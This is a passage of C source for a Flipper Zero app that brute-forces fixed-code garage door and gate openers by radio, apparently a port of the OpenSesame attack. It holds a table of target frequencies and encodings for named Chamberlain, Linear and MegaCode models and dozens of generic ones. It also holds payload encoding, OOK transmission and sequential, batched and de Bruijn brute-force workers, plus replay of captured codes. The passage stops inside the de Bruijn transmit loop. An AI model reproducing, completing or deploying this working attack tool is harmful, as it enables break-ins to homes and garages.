#include <furi.h>
#include <furi_hal.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/view.h>
#include <gui/modules/submenu.h>
#include <gui/modules/widget.h>
#include <input/input.h>
#include <furi_hal_subghz.h>
#include <storage/storage.h>
#include <string.h>
#include <stdlib.h>
#include <math.h>

// --- Constants ---
#define CODE_BUFFER_SIZE 320 // Approx 10-sec rolling buffer
#define WORKER_EVENT_STOP (1 << 0)
#define PAYLOADS_PER_CHUNK 16
#define STORAGE_FILE_PATH EXT_PATH("subghz/opensesame_saved_codes.txt")

// --- Attack Mode Definitions ---
typedef enum {
    AttackModeCompatibility,
    AttackModeStream,
    AttackModeDeBruijn,
    AttackModeReplay,
    AttackModeCount
} AttackMode;

const char* attack_mode_names[] = {
    "Compatibility",
    "Stream",
    "Full de Bruijn",
    "Replay Saved"
};

const char* attack_mode_desc[] = {
    "Slow, reliable\nBest for testing\nOne code at a time",
    "Fast sequential\nMedium speed\nBatch transmission",
    "Optimal sequence\nFastest coverage\nde Bruijn algorithm",
    "Replay saved code\nTransmit 5 times\nMust save first"
};

// --- Target Definitions ---
typedef struct {
    const char* name;
    uint32_t frequency;
    uint8_t bits;
    uint8_t length;
    bool trinary;
    const char* encoding_desc;
    uint32_t b0;
    uint32_t b1;
    uint32_t b2;
} OpenSesameTarget;

const OpenSesameTarget opensesame_targets[] = {
    {
        // Samy's Model #1
        // Index 0
        .name = "Stanley/Linear 310M",
        .frequency = 310000000,
        .bits = 10,
        .length = 4,
        .trinary = false,
        .encoding_desc = "Binary 10-bit",
        .b0 = 0x8,
        .b1 = 0xe,
        .b2 = 0x0,
    },
    {
        // Based on Samy's Model #4 (NSCD)
        // Index 1
        .name = "MegaCode 318M",
        .frequency = 318000000,
        .bits = 8,
        .length = 4,
        .trinary = true,
        .encoding_desc = "Trinary 8-bit",
        .b0 = 0x020100, // Note: Using different bit encodings
        .b1 = 0x03fd00, // from Samy's 9-bit NSCD
        .b2 = 0x03fdfe,
    },
    {
        // Samy's Model #2
        // Index 2
        .name = "Chamberlain 390M",
        .frequency = 390000000,
        .bits = 9,
        .length = 4,
        .trinary = false,
        .encoding_desc = "Binary 9-bit",
        .b0 = 0x8,
        .b1 = 0xe,
        .b2 = 0x0,
    },
    {
        // Samy's Model #3
        // Index 3
        .name = "Chamberlain 315M",
        .frequency = 315000000,
        .bits = 9,
        .length = 4,
        .trinary = false,
        .encoding_desc = "Binary 9-bit",
        .b0 = 0x8,
        .b1 = 0xe,
        .b2 = 0x0,
    },
    // --- MODIFIED: Renamed "Universal (All)" to "All Known Models" ---
    {
        // Index 4
        .name = "All Known Models",
        .frequency = 310000000, // Default freq, will be overridden
        .bits = 10, // Default bits, will be overridden
        .length = 4,
        .trinary = false,
        .encoding_desc = "Cycles known 4 targets",
        .b0 = 0x8,
        .b1 = 0xe,
        .b2 = 0x0,
    },
    // --- MODIFIED: Renamed "Universal (Brute)" to "Generic (Brute)" ---
    {
        // Index 5
        .name = "Generic (Brute)",
        .frequency = 310000000, // Default freq, will be overridden
        .bits = 10, // Default bits, will be overridden
        .length = 4,
        .trinary = false,
        .encoding_desc = "All Known + Generic Brute",
        .b0 = 0x8,
        .b1 = 0xe,
        .b2 = 0x0,
    },
    // --- MODIFIED: Internal Brute-Force Targets (Not user-selectable) ---
    // These are added for the Generic (Brute) mode, ordered by likelyhood.
    { 
        // Index 6
        .name = "Internal Brute 300M 10b",
        .frequency = 300000000,
        .bits = 10, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 7
        .name = "Internal Brute 315M 8b",
        .frequency = 315000000,
        .bits = 8, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 8
        .name = "Internal Brute 390M 8b",
        .frequency = 390000000,
        .bits = 8, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 9
        .name = "Internal Brute 390M 10b",
        .frequency = 390000000,
        .bits = 10, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 10
        .name = "Internal Brute 315M 10b",
        .frequency = 315000000,
        .bits = 10, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 11
        .name = "Internal Brute 310M 8b",
        .frequency = 310000000,
        .bits = 8, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 12
        .name = "Internal Brute 300M 8b",
        .frequency = 300000000,
        .bits = 8, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 13
        .name = "Internal Brute 315M 12b",
        .frequency = 315000000,
        .bits = 12, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 14
        .name = "Internal Brute 390M 12b",
        .frequency = 390000000,
        .bits = 12, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 15
        .name = "Internal Brute 310M 12b",
        .frequency = 310000000,
        .bits = 12, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 16
        .name = "Internal Brute 300M 12b",
        .frequency = 300000000,
        .bits = 12, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 17
        .name = "Internal Brute 318M 8b Bin",
        .frequency = 318000000,
        .bits = 8, .length = 4, .trinary = false, // Binary, not trinary
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 18
        .name = "Internal Brute 318M 10b",
        .frequency = 318000000,
        .bits = 10, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 19
        .name = "Internal Brute 318M 12b",
        .frequency = 318000000,
        .bits = 12, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 20
        .name = "Internal Brute 303M 8b",
        .frequency = 303875000,
        .bits = 8, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 21
        .name = "Internal Brute 303M 10b",
        .frequency = 303875000,
        .bits = 10, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 22
        .name = "Internal Brute 433M 8b",
        .frequency = 433920000,
        .bits = 8, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 23
        .name = "Internal Brute 433M 10b",
        .frequency = 433920000,
        .bits = 10, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    // --- NEWLY ADDED TARGETS (21) ---
    { 
        // Index 24
        .name = "Internal Brute 303M 12b",
        .frequency = 303875000,
        .bits = 12, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 25
        .name = "Internal Brute 433M 12b",
        .frequency = 433920000,
        .bits = 12, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 26
        .name = "Internal Brute 310M 9b",
        .frequency = 310000000,
        .bits = 9, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 27
        .name = "Internal Brute 300M 9b",
        .frequency = 300000000,
        .bits = 9, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 28
        .name = "Internal Brute 318M 9b",
        .frequency = 318000000,
        .bits = 9, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 29
        .name = "Internal Brute 303M 9b",
        .frequency = 303875000,
        .bits = 9, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 30
        .name = "Internal Brute 433M 9b",
        .frequency = 433920000,
        .bits = 9, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 31
        .name = "Internal Brute 310M 11b",
        .frequency = 310000000,
        .bits = 11, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 32
        .name = "Internal Brute 315M 11b",
        .frequency = 315000000,
        .bits = 11, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 33
        .name = "Internal Brute 390M 11b",
        .frequency = 390000000,
        .bits = 11, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 34
        .name = "Internal Brute 300M 11b",
        .frequency = 300000000,
        .bits = 11, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 35
        .name = "Internal Brute 318M 11b",
        .frequency = 318000000,
        .bits = 11, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 36
        .name = "Internal Brute 433M 11b",
        .frequency = 433920000,
        .bits = 11, .length = 4, .trinary = false,
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 37
        .name = "Internal Brute 310M 14b",
        .frequency = 310000000,
        .bits = 14, .length = 4, .trinary = false, // de Bruijn incompatible (n > 13)
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 38
        .name = "Internal Brute 315M 14b",
        .frequency = 315000000,
        .bits = 14, .length = 4, .trinary = false, // de Bruijn incompatible (n > 13)
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 39
        .name = "Internal Brute 390M 14b",
        .frequency = 390000000,
        .bits = 14, .length = 4, .trinary = false, // de Bruijn incompatible (n > 13)
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 40
        .name = "Internal Brute 300M 14b",
        .frequency = 300000000,
        .bits = 14, .length = 4, .trinary = false, // de Bruijn incompatible (n > 13)
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 41
        .name = "Internal Brute 318M 14b",
        .frequency = 318000000,
        .bits = 14, .length = 4, .trinary = false, // de Bruijn incompatible (n > 13)
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 42
        .name = "Internal Brute 433M 14b",
        .frequency = 433920000,
        .bits = 14, .length = 4, .trinary = false, // de Bruijn incompatible (n > 13)
        .encoding_desc = "Internal", .b0 = 0x8, .b1 = 0xe, .b2 = 0x0,
    },
    { 
        // Index 43
        .name = "Internal Brute 315M 9b Tri",
        .frequency = 315000000,
        .bits = 9, .length = 4, .trinary = true, // de Bruijn incompatible (n > 8)
        .encoding_desc = "Internal", .b0 = 0x020100, .b1 = 0x03fd00, .b2 = 0x03fdfe,
    },
    { 
        // Index 44
        .name = "Internal Brute 390M 9b Tri",
        .frequency = 390000000,
        .bits = 9, .length = 4, .trinary = true, // de Bruijn incompatible (n > 8)
        .encoding_desc = "Internal", .b0 = 0x020100, .b1 = 0x03fd00, .b2 = 0x03fdfe,
    },
};
// --- MODIFIED: Define visible count vs total count ---
const uint8_t opensesame_target_count = 6; // User-selectable targets (0-5)
const uint8_t opensesame_total_target_count = COUNT_OF(opensesame_targets); // All targets (45)

// --- OOK Preset ---
static const uint8_t opensesame_ook_preset_data[] __attribute__((aligned(4))) = {
    0x02, 0x0D, 0x03, 0x07, 0x08, 0x32, 0x0B, 0x06, 0x15, 0x40, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// --- View ID ---
typedef enum {
    ViewIdMenu,
    ViewIdAttackMode,
    ViewIdTargetSelect,
    ViewIdConfig,
    ViewIdCodeBuffer,
    ViewIdSavedCodes,
    ViewIdAttack,
    ViewIdAbout,
    ViewIdDirections,
} OpenSesameViewId;

// --- Submenu Items ---
typedef enum {
    SubmenuIndexStartAttack,
    SubmenuIndexAttackMode,
    SubmenuIndexTargetSelect,
    SubmenuIndexShowConfig,
    SubmenuIndexCodeBuffer,
    SubmenuIndexSavedCodes,
    SubmenuIndexDirections,
    SubmenuIndexAbout,
    SubmenuIndexExit,
} SubmenuIndex;

// --- Code Buffer Structure ---
typedef struct {
    uint32_t codes[CODE_BUFFER_SIZE];
    uint32_t head; // Points to the OLDEST code
    uint32_t count; // Number of items in buffer
} CodeBuffer;

// --- App Structure ---
typedef struct {
    Gui* gui;
    ViewDispatcher* view_dispatcher;

    Submenu* submenu;
    Widget* attack_mode_widget;
    Widget* target_widget;
    Widget* config_widget;
    Widget* about_widget;
    Widget* directions_widget;
    View* buffer_view;
    View* saved_codes_view;
    View* attack_view;

    uint8_t current_target_index;
    AttackMode attack_mode;
    uint8_t about_page; // 0-3: Thank You, About, Usage, License
    
    // Code buffer and saved codes
    CodeBuffer code_buffer;
    uint8_t selected_buffer_index;
    uint32_t saved_code[4]; // FIXED: One per target (0, 1, 2, 3)
    
    // Attack state
    FuriThread* worker_thread;
    volatile bool is_attacking;
    volatile bool save_requested;
    volatile uint32_t current_code;
    volatile uint32_t codes_transmitted;
    volatile uint8_t current_attack_target_idx; // For saving in universal mode
    uint32_t max_code;
    const char* attack_animation_chars;
    uint8_t attack_animation_index;
} OpenSesameApp;

// --- Forward Declarations ---
static void opensesame_push_code_to_buffer(OpenSesameApp* app, uint32_t code);
static void opensesame_load_codes(OpenSesameApp* app);
static void opensesame_save_codes(OpenSesameApp* app);
static void about_widget_setup(OpenSesameApp* app);

// --- Code Buffer Management ---
static void opensesame_push_code_to_buffer(OpenSesameApp* app, uint32_t code) {
    if(app == NULL) return;
    
    CodeBuffer* buffer = &app->code_buffer;
    
    uint32_t next_idx = (buffer->head + buffer->count) % CODE_BUFFER_SIZE;

    if(buffer->count == CODE_BUFFER_SIZE) {
        buffer->head = (buffer->head + 1) % CODE_BUFFER_SIZE;
    } else {
        buffer->count++;
    }
    
    buffer->codes[next_idx] = code;
}

// --- Persistence (SD Card) ---
static void opensesame_load_codes(OpenSesameApp* app) {
    if(app == NULL) return;
    
    Storage* storage = furi_record_open(RECORD_STORAGE);
    if(storage == NULL) {
        FURI_LOG_E("OpenSesame", "Failed to open storage");
        return;
    }
    
    File* file = storage_file_alloc(storage);
    if(file == NULL) {
        FURI_LOG_E("OpenSesame", "Failed to allocate file");
        furi_record_close(RECORD_STORAGE);
        return;
    }

    if(storage_file_open(file, STORAGE_FILE_PATH, FSAM_READ, FSOM_OPEN_EXISTING)) {
        size_t bytes_read = storage_file_read(file, app->saved_code, sizeof(app->saved_code));
        if(bytes_read != sizeof(app->saved_code)) {
            FURI_LOG_W("OpenSesame", "Save file size mismatch, resetting");
            memset(app->saved_code, 0, sizeof(app->saved_code));
        }
    } else {
        FURI_LOG_I("OpenSesame", "No save file found");
        memset(app->saved_code, 0, sizeof(app->saved_code));
    }

    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

static void opensesame_save_codes(OpenSesameApp* app) {
    if(app == NULL) return;
    
    Storage* storage = furi_record_open(RECORD_STORAGE);
    if(storage == NULL) {
        FURI_LOG_E("OpenSesame", "Failed to open storage");
        return;
    }
    
    File* file = storage_file_alloc(storage);
    if(file == NULL) {
        FURI_LOG_E("OpenSesame", "Failed to allocate file");
        furi_record_close(RECORD_STORAGE);
        return;
    }

    storage_common_mkdir(storage, EXT_PATH("subghz"));

    if(storage_file_open(file, STORAGE_FILE_PATH, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        size_t bytes_written = storage_file_write(file, app->saved_code, sizeof(app->saved_code));
        if(bytes_written == sizeof(app->saved_code)) {
            FURI_LOG_I("OpenSesame", "Codes saved successfully");
        }
    }

    storage_file_close(file);
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

// --- Payload Generation ---
static void opensesame_generate_payload(
    uint32_t code,
    const OpenSesameTarget* target,
    uint8_t* payload_buffer,
    size_t payload_buffer_size) {
    if(target == NULL || payload_buffer == NULL) return;
    
    memset(payload_buffer, 0, payload_buffer_size);

    uint32_t temp_code = code;
    uint32_t divisor = 1;
    uint32_t base = target->trinary ? 3 : 2;

    if(target->bits > 0) {
        if((!target->trinary && target->bits > 31) || (target->trinary && target->bits > 19)) {
            divisor = 0;
        } else if (target->bits > 1) {
             divisor = (uint32_t)pow(base, target->bits - 1);
        }
    }

    size_t current_bit_index = 0;
    for(uint8_t i = 0; i < target->bits; i++) {
        uint8_t digit = (divisor > 0) ? (temp_code / divisor) : temp_code;
        if(divisor > 0) {
            temp_code %= divisor;
            divisor /= base;
        }

        uint32_t bit_pattern;
        if(digit == 0)
            bit_pattern = target->b0;
        else if(digit == 1)
            bit_pattern = target->b1;
        else
            bit_pattern = target->b2;

        for(uint8_t j = 0; j < target->length; j++) {
            bool bit_is_set = (bit_pattern >> (target->length - 1 - j)) & 1;
            if(bit_is_set) {
                size_t byte_index = current_bit_index / 8;
                size_t bit_in_byte_index = 7 - (current_bit_index % 8);
                payload_buffer[byte_index] |= (1 << bit_in_byte_index);
            }
            current_bit_index++;
        }
    }
}

// --- Transmission ---
typedef struct {
    uint8_t* buffer;
    size_t size;
    size_t position;
} TxContext;

static LevelDuration opensesame_tx_callback(void* context) {
    if(context == NULL) return level_duration_reset();
    
    TxContext* tx_ctx = (TxContext*)context;

    if(tx_ctx->position >= tx_ctx->size * 8) {
        return level_duration_reset();
    }

    size_t byte_idx = tx_ctx->position / 8;
    size_t bit_idx = 7 - (tx_ctx->position % 8);
    bool bit_value = (tx_ctx->buffer[byte_idx] >> bit_idx) & 1;

    tx_ctx->position++;

    uint32_t duration = 650;
    return level_duration_make(bit_value, duration);
}

static void opensesame_transmit_raw(uint32_t frequency, uint8_t* buffer, size_t size) {
    if(buffer == NULL || size == 0) return;
    
    TxContext tx_ctx = {.buffer = buffer, .size = size, .position = 0};

    furi_hal_subghz_reset();
    furi_hal_subghz_load_custom_preset(opensesame_ook_preset_data);
    furi_hal_subghz_set_frequency_and_path(frequency);

    if(furi_hal_subghz_start_async_tx(opensesame_tx_callback, &tx_ctx)) {
        // --- FIX: Replaced -> with . because tx_ctx is a struct, not a pointer ---
        while(tx_ctx.position < size * 8) {
            if(furi_thread_flags_get() & WORKER_EVENT_STOP) {
                furi_hal_subghz_stop_async_tx();
                furi_hal_subghz_sleep();
                return;
            }
            furi_delay_ms(10);
        }
        furi_hal_subghz_stop_async_tx();
    }

    furi_hal_subghz_sleep();
    furi_delay_ms(5);
}

// --- Helper for de Bruijn ---
static size_t opensesame_append_digit_pattern(
    uint8_t digit,
    const OpenSesameTarget* target,
    uint8_t* buffer,
    size_t bit_offset) {
    if(target == NULL || buffer == NULL) return bit_offset;
    
    uint32_t bit_pattern;
    if(digit == 0)
        bit_pattern = target->b0;
    else if(digit == 1)
        bit_pattern = target->b1;
    else
        bit_pattern = target->b2;

    size_t current_bit_index = bit_offset;
    for(uint8_t j = 0; j < target->length; j++) {
        bool bit_is_set = (bit_pattern >> (target->length - 1 - j)) & 1;
        if(bit_is_set) {
            size_t byte_index = current_bit_index / 8;
            size_t bit_in_byte_index = 7 - (current_bit_index % 8);
            buffer[byte_index] |= (1 << bit_in_byte_index);
        }
        current_bit_index++;
    }
    return current_bit_index;
}

// --- Worker Functions ---

// --- MODIFIED: Added target loop for meta-modes ---
static int32_t opensesame_worker_compatibility(OpenSesameApp* app, const OpenSesameTarget* target) {
    UNUSED(target); // We use app->current_target_index
    
    // --- NEW: Target loop logic ---
    bool is_all_known = (app->current_target_index == 4);
    bool is_generic_brute = (app->current_target_index == 5);

    uint8_t target_start = 0;
    uint8_t target_end = 0;

    if(is_generic_brute) {
        target_start = 0;
        target_end = opensesame_total_target_count - 1;
    } else if(is_all_known) {
        target_start = 0;
        target_end = 3; 
    } else {
        target_start = app->current_target_index;
        target_end = app->current_target_index;
    }
    // --- End new logic ---

    for(uint8_t target_idx = target_start; target_idx <= target_end; target_idx++) {
        if(target_idx == 4 || target_idx == 5) continue; // Skip meta-targets
        if(furi_thread_flags_get() & WORKER_EVENT_STOP) break;

        const OpenSesameTarget* current_target = &opensesame_targets[target_idx];
        app->current_attack_target_idx = target_idx; // For saving
        FURI_LOG_I("OpenSesame", "Compat: Starting %s", current_target->name);

        // Calculate max_code for *this specific target*
        const uint8_t n = current_target->bits;
        const uint8_t k = current_target->trinary ? 3 : 2;
        if((!current_target->trinary && n > 31) || (current_target->trinary && n > 19)) {
            FURI_LOG_W("OpenSesame", "Target %s too large, skipping", current_target->name);
            continue; 
        }
        uint32_t target_max_code = (uint32_t)pow(k, n);

        if(target_max_code == 0) {
             FURI_LOG_W("OpenSesame", "Target %s max code is 0, skipping", current_target->name);
            continue;
        }

        size_t total_bits_per_payload = current_target->bits * current_target->length;
        size_t payload_size_bytes = (total_bits_per_payload + 7) / 8;
        
        uint8_t* payload_buffer = malloc(payload_size_bytes);
        if(payload_buffer == NULL) {
            FURI_LOG_E("OpenSesame", "Failed to allocate payload buffer");
            return -1;
        }

        for(uint32_t code = 0; code < target_max_code; code++) {
            if(furi_thread_flags_get() & WORKER_EVENT_STOP) break;

            app->current_code = code; // For inner-loop display
            app->codes_transmitted++; // For global progress bar

            opensesame_generate_payload(code, current_target, payload_buffer, payload_size_bytes);
            opensesame_transmit_raw(current_target->frequency, payload_buffer, payload_size_bytes);
            opensesame_push_code_to_buffer(app, code);
            
            if(code % 10 == 0) {
                furi_delay_ms(1);
            }
        }
        free(payload_buffer);

        // Delay between targets in meta-modes
        if((is_all_known || is_generic_brute) && target_idx < target_end) {
            if(target_idx + 1 != 4 && target_idx + 1 != 5) {
                furi_delay_ms(100);
            }
        }
    }
    return 0;
}

// --- MODIFIED: Added target loop for meta-modes ---
static int32_t opensesame_worker_stream(OpenSesameApp* app, const OpenSesameTarget* target) {
    UNUSED(target); // We use app->current_target_index

    // --- NEW: Target loop logic ---
    bool is_all_known = (app->current_target_index == 4);
    bool is_generic_brute = (app->current_target_index == 5);

    uint8_t target_start = 0;
    uint8_t target_end = 0;

    if(is_generic_brute) {
        target_start = 0;
        target_end = opensesame_total_target_count - 1;
    } else if(is_all_known) {
        target_start = 0;
        target_end = 3; 
    } else {
        target_start = app->current_target_index;
        target_end = app->current_target_index;
    }
    // --- End new logic ---

    for(uint8_t target_idx = target_start; target_idx <= target_end; target_idx++) {
        if(target_idx == 4 || target_idx == 5) continue; // Skip meta-targets
        if(furi_thread_flags_get() & WORKER_EVENT_STOP) break;

        const OpenSesameTarget* current_target = &opensesame_targets[target_idx];
        app->current_attack_target_idx = target_idx; // For saving
        FURI_LOG_I("OpenSesame", "Stream: Starting %s", current_target->name);

        // Calculate max_code for *this specific target*
        const uint8_t n = current_target->bits;
        const uint8_t k = current_target->trinary ? 3 : 2;
        if((!current_target->trinary && n > 31) || (current_target->trinary && n > 19)) {
            FURI_LOG_W("OpenSesame", "Target %s too large, skipping", current_target->name);
            continue; 
        }
        uint32_t target_max_code = (uint32_t)pow(k, n);

        if(target_max_code == 0) {
             FURI_LOG_W("OpenSesame", "Target %s max code is 0, skipping", current_target->name);
            continue;
        }

        size_t total_bits_per_payload = current_target->bits * current_target->length;
        size_t payload_size_bytes = (total_bits_per_payload + 7) / 8;
        
        uint8_t* single_payload = malloc(payload_size_bytes);
        if(single_payload == NULL) {
            FURI_LOG_E("OpenSesame", "Failed to allocate single payload");
            return -1;
        }

        size_t chunk_size = payload_size_bytes * PAYLOADS_PER_CHUNK;
        uint8_t* chunk_buffer = malloc(chunk_size);
        if(chunk_buffer == NULL) {
            FURI_LOG_E("OpenSesame", "Failed to allocate chunk buffer");
            free(single_payload);
            return -1;
        }

        size_t current_in_chunk = 0;
        memset(chunk_buffer, 0, chunk_size);

        for(uint32_t code = 0; code < target_max_code; code++) {
            if(furi_thread_flags_get() & WORKER_EVENT_STOP) break;

            app->current_code = code; // For inner-loop display
            app->codes_transmitted++; // For global progress bar

            opensesame_generate_payload(code, current_target, single_payload, payload_size_bytes);
            memcpy(chunk_buffer + (current_in_chunk * payload_size_bytes), single_payload, payload_size_bytes);
            current_in_chunk++;
            opensesame_push_code_to_buffer(app, code);

            if(current_in_chunk == PAYLOADS_PER_CHUNK || code == target_max_code - 1) {
                size_t transmit_size = current_in_chunk * payload_size_bytes;
                opensesame_transmit_raw(current_target->frequency, chunk_buffer, transmit_size);
                memset(chunk_buffer, 0, chunk_size);
                current_in_chunk = 0;
                
                furi_delay_ms(5);
            }
        }
        free(chunk_buffer);
        free(single_payload);

        // Delay between targets in meta-modes
        if((is_all_known || is_generic_brute) && target_idx < target_end) {
            if(target_idx + 1 != 4 && target_idx + 1 != 5) {
                furi_delay_ms(100);
            }
        }
    }
    return 0;
}

static int32_t opensesame_worker_debruijn(OpenSesameApp* app, const OpenSesameTarget* target) {
    UNUSED(target); // We use app->current_target_index
    
    // Check which meta-mode is active, or if it's a single target
    bool is_all_known = (app->current_target_index == 4);
    bool is_generic_brute = (app->current_target_index == 5); // Renamed

    uint8_t target_start = 0;
    uint8_t target_end = 0;

    if(is_generic_brute) { // Renamed
        target_start = 0;
        target_end = opensesame_total_target_count - 1; // 0-44
    } else if(is_all_known) {
        target_start = 0;
        target_end = 3; // The 4 known models
    } else { // Single target
        target_start = app->current_target_index;
        target_end = app->current_target_index;
    }
    
    // app->codes_transmitted is reset in submenu callback
    
    for(uint8_t target_idx = target_start; target_idx <= target_end; target_idx++) {
        // NEW: Skip the meta-targets themselves
        if(target_idx == 4 || target_idx == 5) continue; 
        
        if(furi_thread_flags_get() & WORKER_EVENT_STOP) break;
        
        app->code_buffer.head = 0;
        app->code_buffer.count = 0;
        app->current_attack_target_idx = target_idx;
        
        const OpenSesameTarget* current_target = &opensesame_targets[target_idx];
        
        FURI_LOG_I("OpenSesame", "de Bruijn: Starting %s", current_target->name);

        const uint8_t n = current_target->bits;
        const uint8_t k = current_target->trinary ? 3 : 2;

        // --- de Bruijn specific skips ---
        if((!current_target->trinary && n > 13) || (current_target->trinary && n > 8)) {
            FURI_LOG_E("OpenSesame", "Target '%s' (%d bits) too large for de Bruijn, skipping.",
                current_target->name, n);
            if(!is_all_known && !is_generic_brute) { // Renamed
                return -1;
            }
            continue; 
        }
        
        const uint32_t num_codes = (uint32_t)pow(k, n);
        const uint32_t divisor = (uint32_t)pow(k, n - 1);

        size_t seen_size = num_codes * sizeof(bool);
        size_t sequence_size = num_codes * sizeof(uint8_t);
        if(seen_size > 10000 || sequence_size > 10000) {
            FURI_LOG_E("OpenSesame", "Memory allocation too large, aborting");
            return -1;
        }

        bool* seen = malloc(seen_size);
        if(seen == NULL) {
            FURI_LOG_E("OpenSesame", "Failed to allocate seen array");
            return -1;
        }
        
        uint8_t* sequence = malloc(sequence_size);
        if(sequence == NULL) {
            FURI_LOG_E("OpenSesame", "Failed to allocate sequence");
            free(seen);
            return -1;
        }

        memset(seen, 0, seen_size);
        for(uint8_t i = 0; i < n; i++) {
            sequence[i] = 0;
        }
        seen[0] = true;
        uint32_t current_code_val = 0;

        for(uint32_t i = n; i < num_codes; i++) {
            current_code_val = (current_code_val % divisor) * k;

            int d;
            for(d = (int)k - 1; d >= 0; d--) {
                uint32_t next_code_val = current_code_val + (uint32_t)d;
                if(!seen[next_code_val]) {
                    seen[next_code_val] = true;
                    sequence[i] = (uint8_t)d;
                    current_code_val = next_code_val;
                    goto next_digit;
                }
            }
            sequence[i] = 0;
            current_code_val = current_code_val + 0;

        next_digit:
            if(i % 50 == 0) {
                furi_delay_ms(1);
                if(furi_thread_flags_get() & WORKER_EVENT_STOP) {
                    free(seen);
                    free(sequence);
                    return 0;
                }
            }
        }
        free(seen);

        const uint32_t total_digits = num_codes + (n - 1);
        const size_t digits_per_chunk = PAYLOADS_PER_CHUNK;
        const size_t bits_per_chunk = current_target->length * digits_per_chunk;
        const size_t bytes_per_chunk = (bits_per_chunk + 7) / 8;

        FURI_LOG_I("OpenSesame", "Starting transmission of %lu digits", total_digits);

        uint8_t* chunk_buffer = malloc(bytes_per_chunk);
        if(chunk_buffer == NULL) {
            FURI_LOG_E("OpenSesame", "Failed to allocate chunk buffer");
            free(sequence);
            return -1;
        }

        memset(chunk_buffer, 0, bytes_per_chunk);
        size_t bit_offset = 0;
        uint32_t code_register = 0;

        for(uint32_t i = 0; i < total_digits; i++) {
            if(i % 10 == 0) {
                if(furi_thread_flags_get() & WORKER_EVENT_STOP) {
                    free(chunk_buffer);
                    free(sequence);
